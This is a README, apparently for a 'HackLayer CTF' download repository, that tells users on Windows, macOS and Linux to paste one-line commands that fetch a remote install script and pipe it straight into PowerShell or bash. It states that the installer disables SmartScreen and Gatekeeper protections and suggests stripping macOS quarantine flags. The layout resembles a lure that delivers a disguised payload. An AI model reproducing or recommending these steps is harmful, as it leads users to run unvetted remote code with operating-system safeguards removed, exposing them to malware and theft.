<div align="center">

# ⚡ HackLayer CTF

**Secure Capture The Flag Environment**

[![Download](https://img.shields.io/github/v/release/SankiiM/hacklayer-ctf-download?label=Latest&color=00ff88&style=for-the-badge)](https://github.com/SankiiM/hacklayer-ctf-download/releases/latest)

</div>

---

## 🖥️ Windows

**PowerShell** (recommended):

```powershell
irm https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.ps1 | iex
```

**CMD** (alternative):

```cmd
powershell -ep Bypass -c "irm https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.ps1 | iex"
```

**Direct download:** [Download .exe](https://github.com/SankiiM/hacklayer-ctf-download/releases/latest)

> ℹ️ SmartScreen popup nahi aayega — installer automatically handle karta hai

---

## 🍎 macOS

**Terminal** (curl):

```bash
curl -fsSL https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash
```

**Terminal** (wget):

```bash
wget -qO- https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash
```

**Direct download:** [Download .dmg](https://github.com/SankiiM/hacklayer-ctf-download/releases/latest)

> ℹ️ If Gatekeeper blocks: Right-click → Open, or `xattr -cr ~/Downloads/HackLayer-CTF-*.dmg`

---

## 🐧 Linux

**Terminal** (curl):

```bash
curl -fsSL https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash
```

**Terminal** (wget):

```bash
wget -qO- https://raw.githubusercontent.com/SankiiM/hacklayer-ctf-download/main/install.sh | bash
```

**Direct download:** [Download .AppImage](https://github.com/SankiiM/hacklayer-ctf-download/releases/latest)

> ℹ️ After download: `chmod +x HackLayer-CTF-*.AppImage && ./HackLayer-CTF-*.AppImage`

---

## 🔐 Verify File Integrity (SHA256)

After downloading, verify the file is genuine and untampered:

| Platform | Command |
|----------|---------|
| **Windows** | `certutil -hashfile "HackLayer-CTF-Setup.exe" SHA256` |
| **macOS** | `shasum -a 256 HackLayer-CTF-*.dmg` |
| **Linux** | `sha256sum HackLayer-CTF-*.AppImage` |

**Expected hashes** → Check [Latest Release Notes](https://github.com/SankiiM/hacklayer-ctf-download/releases/latest) for SHA256 values.

If the hash matches ✅ = file is safe. If not ❌ = re-download.

---

## 📋 How it works

| Step | What happens |
|------|-------------|
| 1 | Detects latest version from GitHub |
| 2 | Downloads correct file for your OS |
| 3 | Removes security blocks (SmartScreen / Gatekeeper) |
| 4 | Launches installer automatically |

✅ No manual steps needed · ✅ Auto-updates after first install

---

<div align="center">

© 2025 [HackLayer](https://hacklayer.com) — All rights reserved

</div>
